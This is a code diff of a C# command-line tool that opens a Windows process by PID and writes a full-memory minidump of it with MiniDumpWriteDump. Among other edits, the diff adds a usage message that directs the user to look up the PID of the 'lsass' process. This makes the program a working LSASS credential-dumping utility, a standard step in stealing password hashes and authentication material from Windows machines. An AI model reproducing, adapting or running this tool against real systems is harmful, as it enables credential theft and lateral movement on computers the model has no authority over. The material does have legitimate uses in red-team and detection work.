@@ -1,9 +1,10 @@
-using System.ComponentModel;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-namespace HelloWorld;
+namespace minidump;
 
+//process access flags
+//See: https://www.pinvoke.net/default.aspx/Enums/ProcessAccess.html
 public enum ProcessAccessFlags : uint
 {
     All = 0x001F0FFF,
@@ -21,6 +22,8 @@ public enum ProcessAccessFlags : uint
     Synchronize = 0x00100000
 }
 
+//minidump types
+//See: https://github.com/slyd0g/C-Sharp-Out-Minidump
 public enum MINIDUMP_TYPE
 {
     MiniDumpNormal = 0x00000000,
@@ -46,14 +49,6 @@ public enum MINIDUMP_TYPE
     MiniDumpWithModuleHeaders = 0x00080000,
     MiniDumpFilterTriage = 0x00100000,
     MiniDumpValidTypeFlags = 0x001fffff
-}
-
-[StructLayout(LayoutKind.Sequential, Pack = 4)]
-public struct MINIDUMP_EXCEPTION_INFORMATION
-{
-    public uint ThreadId;
-    public IntPtr ExceptionPointers;
-    public int ClientPointers;
 }
 
 // Class that represents a Windows Process
@@ -99,7 +94,6 @@ public class WindowsProcess
         {
             this.functional = false;
         }
-
     }
 
     public int getPid()
@@ -131,20 +125,18 @@ public class WindowsProcess
         }
     }
 
+    //Returns the information, wether the object is functional or defunct (i.e. if currently a running process with the supplied PID exists)
     public bool getFunctionality()
     {
         return this.functional;
     }
 
+    //Create a Minidump-File of the process that corresponds to the Object and save it inside the specified path
     public bool dump(string path)
     {
         if(this.functional && this.handle.ToInt64() != 0)
         {
             FileStream file = File.Create(path);
-            MINIDUMP_EXCEPTION_INFORMATION info = new MINIDUMP_EXCEPTION_INFORMATION();
-            info.ClientPointers = 1;
-            info.ExceptionPointers = Marshal.GetExceptionPointers();
-            info.ThreadId = 0;
             bool ret = MiniDumpWriteDump(this.handle, (uint)this.proc.Id, file.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
             file.Close();
             return ret;
@@ -157,18 +149,16 @@ public class WindowsProcess
 }
 class Hello
 {
-
     static void Main(string[] args)
     {
-     
         if(args.Length != 2)
         {
             System.Console.WriteLine("Usage: " + System.AppDomain.CurrentDomain.FriendlyName + " <pid> <DumpFile>");
+            System.Console.WriteLine("\nTo get the PID of the process run:\n\tGet-Process | Where-Object {$_.ProcessName -eq 'lsass'}\nin PowerShell");
             return;
         }
 
         int pid = Int32.Parse(args[0]);
-
         string path = args[1]; 
         
         WindowsProcess p = new WindowsProcess(pid);
@@ -181,12 +171,12 @@ class Hello
             }
             else
             {
-                System.Console.WriteLine("ERROR: Minidump could not be created successfully!");
+                System.Console.WriteLine("ERROR: Minidump could not be created!");
             }
         }
         else
         {
-            System.Console.WriteLine("ERROR: Please recheck the supplied PID");
+            System.Console.WriteLine("ERROR: Please recheck the supplied PID!");
         }
     }
 }
